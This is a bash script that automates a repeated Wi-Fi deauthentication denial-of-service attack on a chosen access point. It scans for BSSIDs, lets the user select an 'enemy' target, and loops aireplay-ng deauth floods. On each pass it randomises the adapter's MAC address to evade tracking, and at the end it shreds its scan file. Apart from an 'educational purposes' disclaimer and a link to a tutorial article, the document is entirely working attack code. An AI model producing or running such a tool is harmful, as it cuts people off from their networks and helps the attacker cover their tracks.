#! /bin/bash
# Created By: Hacker 27
# FOR EDUCATIONAL PURPOSES ONLY
# This is continous Dos a wireless AP
# Based on this article from Hackers-Arise
# https://www.hackers-arise.com/post/bash-scripting-for-hackers-part-2-building-a-continuous-wi-fi-denial-of-service-tool
# Some APs will not allow this, and you will have to rerun this script with the individual MAC addresses you want to de-authenticate.

# Checks to see if the script is run as root
if [[ "${UID}" -ne 0 ]]; then
    echo 'Please run with sudo or as root.' >&2
    exit 1
fi

# make's sure no programs will interefere with the script
airmon-ng check kill

# put your wireless adapter into monitor mode

airmon-ng start wlan0

# identify the enemy's BSSID and copy it!

airodump-ng wlan0mon > bssids.txt

# store the bssids in an array
bssids=($(grep -oE "([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}" bssids.txt))

# set the BSSID you wish to target

echo "Select a BSSID from the list:"
select bssid in "${bssids[@]}"
do
  echo "You selected $bssid"
  break
done

target_bssid="$bssid"

# Sets how many deauth frame will be send in each attack in the loop

echo "How many deauth frames (the default is continous which is not recommended, 100 is recommended) do you want to send out each strike :"
read -r deauth_frames

# sets how many seconds you want to sleep in between each attach

echo "How many seconds do you want to wait in between each strike :"
read -r sleep_duration

# Creates a for loop that will execute our commands how many times the user specified.
echo "Enter the number of times you wish to run the attack? :"
read -r times

for ((i=1; i<=times; i++))
do
	macchanger -r wlan0mon
	aireplay-ng --deauth "$deauth_frames" -a "$target_bssid" wlan0mon
	sleep "$sleep_duration"
done

# Cleanup and return interface to its original state
airmon-ng stop wlan0mon
shred -vfz bssids.txt
